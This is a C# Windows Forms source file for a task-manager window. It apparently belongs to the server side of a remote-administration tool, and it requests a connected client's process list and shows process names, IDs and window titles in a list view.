using Serveur.Controllers.Server;
using System;
using System.Windows.Forms;

namespace Serveur.Views
{
    public partial class FrmTaskManager : Form
    {
        private readonly ClientMosaic _client;

        public FrmTaskManager(ClientMosaic client)
        {
            _client = client;
            _client.value.frmTm = this;
            InitializeComponent();
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            if (_client != null)
                new Packets.ServerPackets.GetProcesses().Execute(_client);
        }

        public void addProcessesToListView(string pName, int pId, string pTitle)
        {
            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    pName, pId.ToString(), pTitle
                });

                lvProcesses.Invoke((MethodInvoker)delegate
                {
                    lvProcesses.Items.Add(lvi);
                });
            }
            catch (InvalidOperationException)
            {

            }
        }

        public void clearListViewItems()
        {
            try
            {
                lvProcesses.Invoke((MethodInvoker)delegate
                {
                    lvProcesses.Items.Clear();
                });
            }
            catch (InvalidOperationException)
            {

            }
        }
    }
}
